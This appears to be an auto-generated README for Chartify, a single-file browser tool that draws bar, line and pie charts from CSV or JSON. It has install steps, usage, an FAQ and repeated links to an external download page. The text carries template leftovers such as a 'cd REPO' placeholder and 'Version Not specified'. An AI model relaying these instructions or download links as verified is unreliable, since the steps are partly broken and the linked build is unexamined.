# Chartify - Data Visualization 2026

> **Chartify is a single-file, local-first chart generator for web browsers that turns CSV or JSON array data into bar, line, and pie charts, with SVG and high-resolution PNG export.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ekrause24/chartify-win-62936?style=flat-square)](https://github.com/ekrause24/chartify-win-62936)

---

<p align="center">
  <a href="https://ekrause24.github.io/chartify-win-62936/">
    <img src="https://img.shields.io/badge/Download-Chartify%20Latest-brightgreen?style=for-the-badge" alt="Download Chartify">
  </a>
</p>

> **[Direct Download - Chartify](https://ekrause24.github.io/chartify-win-62936/)**

---

[Download Latest Build](https://ekrause24.github.io/chartify-win-62936/)

---

## About Chartify

Chartify is a browser-based chart generator designed for quickly turning structured data into visual reports. It accepts CSV files and JSON arrays, allowing users to choose which fields provide labels and values before creating bar, line, or pie charts.

The application is delivered as a single HTML file and runs locally in the browser. Data stays within the local workflow rather than being uploaded, while built-in dark and light themes make the interface suitable for different working environments. Charts can be saved as SVG files or exported as high-resolution PNG images.

---

## Features

- Create bar, line, and pie charts from structured data.
- Import CSV files or JSON arrays.
- Select label and value columns for chart generation.
- Export charts as SVG graphics.
- Save high-resolution PNG images.
- Work locally in a web browser without uploading data.
- Switch between dark and light themes.
- Use a single-file application with zero third-party dependencies.

---

## Installation

### Download

1. Open the [latest Chartify build](https://ekrause24.github.io/chartify-win-62936/).
2. Download the single-file HTML application.
3. Open the file in a modern web browser.

### Clone the repository

```bash
git clone https://github.com/ekrause24/chartify-win-62936.git
cd REPO
```

Open the Chartify HTML file directly in your browser. No package installation or build step is required.

---

## Usage

1. Launch the Chartify HTML file in a web browser.
2. Import a CSV file or provide a JSON array.
3. Select the column used for labels.
4. Select the column containing numeric values.
5. Choose a bar, line, or pie chart.
6. Adjust the display theme if needed.
7. Export the result as SVG or high-resolution PNG.

Example JSON array:

```json
[
  { "month": "January", "sales": 120 },
  { "month": "February", "sales": 175 },
  { "month": "March", "sales": 150 }
]
```

For this example, use `month` as the label field and `sales` as the value field.

---

## Configuration

Chartify does not require a separate configuration file. Its controls are available directly in the browser interface, including:

- Input format selection
- Label and value column mapping
- Chart type selection
- Dark or light theme selection
- SVG and PNG export options

Because the tool is single-file and local-first, its HTML file can be kept with the data workflow or opened whenever chart generation is needed.

---

## Requirements

- A modern web browser with JavaScript enabled.
- A CSV file or JSON array containing chart data.
- Local storage for the application file and exported charts.
- No server, package manager, or third-party dependency installation required.

---

## FAQ

### Which chart formats are available?

Chartify supports bar, line, and pie charts.

### What input data can I use?

You can provide CSV data or a JSON array. After importing the data, select the fields that should be used for labels and values.

### Can I use Chartify offline?

Yes. Chartify runs locally in the browser as a single-file application and does not upload the data used for chart generation.

### Where are settings stored?

Chartify uses controls within the application rather than a separate settings file. Theme and chart options can be selected during each session.

### How do I export a chart?

After creating the chart, choose SVG for a vector graphic or high-resolution PNG for an image file.

### What should I check if a chart does not appear?

Confirm that the input is valid CSV or a JSON array, then verify that the selected label and value fields contain compatible data. Also ensure JavaScript is enabled in the browser.

### How do I get updates?

Download the latest build from the [Chartify download page](https://ekrause24.github.io/chartify-win-62936/).

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
